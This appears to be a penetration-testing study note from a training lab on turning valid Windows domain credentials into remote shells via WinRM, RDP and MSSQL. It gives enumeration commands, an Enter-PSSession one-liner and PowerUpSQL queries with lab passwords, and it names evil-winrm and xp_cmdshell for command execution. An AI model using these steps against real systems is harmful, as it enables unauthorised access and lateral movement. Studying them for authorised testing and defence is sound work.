# 01.22 Privileged Access - WinRM RDP MSSQL

> Convert valid creds into shells via WinRM (`evil-winrm`), RDP, or MSSQL `xp_cmdshell` after enumerating remote-access rights.

## Overview

After gaining credentials, enumerate remote access rights: RDP, WinRM, and MSSQL sysadmin. Use Get-NetLocalGroupMember to check local groups. Enter-PSSession or evil-winrm for WinRM; PowerUpSQL + mssqlclient.py for MSSQL; xp_cmdshell for OS command execution.

## Steps

- Get-NetLocalGroupMember to check Remote Desktop Users and Remote Management Users groups.
- BloodHound CanRDP, CanPSRemote, SQLAdmin edges visualize access.
- Enter-PSSession with PSCredential for WinRM from Windows.
- evil-winrm -i IP -u user for WinRM from Linux.
- PowerUpSQL Get-SQLInstanceDomain + Get-SQLQuery for MSSQL enumeration.
- mssqlclient.py -windows-auth for MSSQL from Linux; enable_xp_cmdshell for OS exec.

## Commands

### Enum RDP group

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

### Enum WinRM group

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

### Enter-PSSession

```powershell
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force; $cred = new-object System.Management.Automation.PSCredential ("<DOMAIN>\forend", $password); Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```

### evil-winrm

```bash
evil-winrm -i <TARGET> -u forend
```

### PowerUpSQL query

```powershell
Import-Module .\PowerUpSQL.ps1; Get-SQLInstanceDomain; Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "<DOMAIN>\damundsen" -password "SQL1234!" -query 'Select @@version'
```
